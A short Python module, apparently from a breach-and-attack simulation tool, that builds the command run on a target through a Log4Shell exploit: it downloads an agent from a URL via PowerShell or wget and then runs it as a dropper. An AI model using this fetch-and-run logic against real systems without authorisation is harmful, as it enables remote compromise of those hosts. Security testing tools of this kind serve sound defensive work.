import logging

from agentpluginapi import TargetHost
from monkeytypes import OperatingSystem

from common.command_builder import (
    DownloadMethod,
    DownloadOptions,
    IAgentCommandBuilder,
    MonkeyArgs,
    RunOptions,
    Shell,
)
from infection_monkey.exploit.tools.helpers import get_agent_dst_path

logger = logging.getLogger(__name__)


def build_log4shell_command(
    target_host: TargetHost, agent_download_url: str, agent_command_builder: IAgentCommandBuilder
) -> str:
    monkey_path = get_agent_dst_path(target_host)
    download_options = None
    run_options = None

    if target_host.operating_system in [
        OperatingSystem.WINDOWS,
        None,  # Based on a quick Shodan search, tomcat seems to be
        # the most popular service out of the three that we have,
        # and is mostly deployed on Windows.
        # If the target host's OS is unknown, default to Windows.
    ]:
        download_options = DownloadOptions(
            agent_destination_path=monkey_path,
            download_method=DownloadMethod.WEB_REQUEST,
            download_url=agent_download_url,
            shell=Shell.POWERSHELL,
        )
        run_options = RunOptions(agent_destination_path=monkey_path, monkey_args=MonkeyArgs.DROPPER)
    else:
        download_options = DownloadOptions(
            agent_destination_path=monkey_path,
            download_method=DownloadMethod.WGET,
            download_url=agent_download_url,
            shell=Shell.BASH,
        )

        run_options = RunOptions(agent_destination_path=monkey_path, monkey_args=MonkeyArgs.DROPPER)

    download_command = agent_command_builder.build_download_command(download_options)
    run_command = agent_command_builder.build_run_command(run_options)
    command = " ; ".join([download_command, run_command])

    logger.debug(f"COMMAND: {command}")
    return command
